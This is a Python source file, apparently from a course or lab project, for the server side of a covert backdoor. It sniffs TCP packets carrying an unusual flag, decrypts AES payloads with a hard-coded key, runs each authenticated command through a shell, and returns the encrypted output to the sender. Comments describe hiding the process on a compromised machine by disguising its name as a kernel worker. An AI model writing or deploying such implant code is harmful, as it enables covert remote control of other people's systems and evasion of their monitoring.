import sys
import subprocess
import setproctitle
from scapy.all import *
from Crypto.Cipher import AES


######################################################################
#	Function: usage()
#
#	Description:
#	If user runs the program incorrectly, the function prints out the
#	correct usage of this program then exits.
#		
#	Input:
#	User must input a total of three arguments to run the program 
#	correctly
#
#	Output:
#	Program starts
#	
#	To run the program:
#	python server.py [Server port] [Client Port]
#
#	Example:
#	python server.py 8505 8506
######################################################################
def usage():
    if len(sys.argv) != 3:
        print "To use: ", sys.argv[0] + "[Server Port] [Client Port]"
        sys.exit()

######################################################################
#	Function: encryptCommand(message)
#
#	Parameter: message
#
#	Description:
#	When the function is called, a string must be included to be 
#	encrypted. It is then passed to the variable message and 
#	the function then encrypts the data using the AES algorithm
#	with the secret key and salt provided and returns the 
#	encrypted data back to whichever called the function.
#	
#	Input:
#	Data to be encrypted
#
#	Output:
#	Returns an ecnrypted data
######################################################################
def encryptCommand(message):
    #secret key and salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #encryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #encrypt the data
    encryptedData = crypt.encrypt(message)
    return encryptedData

######################################################################
#	Function: decryptCommand(message)
#
#	Parameter: message
#
#	Description:
#	When the function is called, an encrypted data must included to be
#	decrypted. The data is then passed to the variable message and the
#	function then decrypts the data using the AES algorithm and the
#	secret key and salt provided. The function then returns the 
#	decrypted data back to whichever called this function.
#	
#	Input:
#	Encrypted data to be decrypted
#
#	Output:
#	Returns decrypted data
######################################################################
def decryptCommand(message):
    #secret key and salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #decryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #decrypt the data
    decryptedData = crypt.decrypt(message)
    return decryptedData

######################################################################
#	Function: server(pkt)
#
#	Parameter: pkt
#
#	Description:
#	This function runs for every TCP packet with the destination port
#	specified by the user. The function checks if the flag received is
#	type "C" and if the destination port from the client is the same
#	as the server port. If it is, then we grab the source IP address of
#	the client form the packet received and decrypt the data. We check
#	if the data starts with the authentication string or not. If the 
#	data has the authentication string, we then take out the 
#	authentication string and grab the rest of the data. We check if
#	the remaining data contains "exit", which we send back the exit
#	command to the client, otherwise we run the command in a subprocess.
#	After running the command, we grab the output and encrypt the whole
#	output as well as the authentication string and sends it back to 
#	the client.
#	
#	Input:
#	The packet received from sniffing TCP and the destination port
#
#	Output:
#	Sending encrypted output to client
######################################################################
def server(pkt):
    #Grab the flag from the packet
    flagSet = pkt['TCP'].flags
    #Grab the destination port from the packet
    dport = pkt[TCP].dport
    #key to authenticating the packet
    authPacket = "Authenticate packets"
    #Checks for the flag if it is "C"
    #Note that the "C" flag in long is 128
    if flagSet == long(128):
        if dport == destPort:
        	#Grab the source IP for each packets
            src_ip = pkt[IP].src
            #Instantiate variables
            decryptedData=""
            newData = ""
            #Grab the raw data
            data = pkt[Raw].load
            #Decrypt the raw data
            decryptedData = decryptCommand(data)
            #If the decrypted data is authenticated, print it
            if decryptedData.startswith(authPacket) == True:
                #Take out the authentication part
                newData = decryptedData[20:]
                #If we get exit command, send exit command back to client
                if newData == "exit":
                    encryptExit = encryptCommand(authPacket + newData)
                    pkt = IP(dst=str(src_ip))/TCP(dport=int(clientPort), flags='C')/Raw(load=encryptExit)
                    #Send the packet
                    send(pkt)
                    time.sleep(2)
                else:
                    #Run the command using a child process so that it is hidden
                    process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    #Store the output of the command into output variable
                    output = process.stdout.read() + process.stderr.read()
                    #Encrypt the output and add the packet authenticator before sending back
                    encryptedReply = encryptCommand(authPacket + output)
                    #Create the output packet
                    pkt = IP(dst=str(src_ip))/TCP(dport=int(clientPort), flags='C')/Raw(load=encryptedReply)
                    #Send the packet
                    send(pkt)
            else:
                return

if __name__ == "__main__":
	#Call usage first to make sure the user is using te program correctly
    usage()
    destPort = sys.argv[1]
    clientPort = sys.argv[2]
    #Change process name so that we can hide this program on a compromised machine
    #Make it look like a legitimate process running in the background
    #Usually we want to use something like kworker/2:1 to mask the program
    title = "Backdoor Test"
    setproctitle.setproctitle(title)
    #Sniff for TCP packets with destination port specified by the user
    sniff(filter="tcp and dst port " + destPort, prn=server)
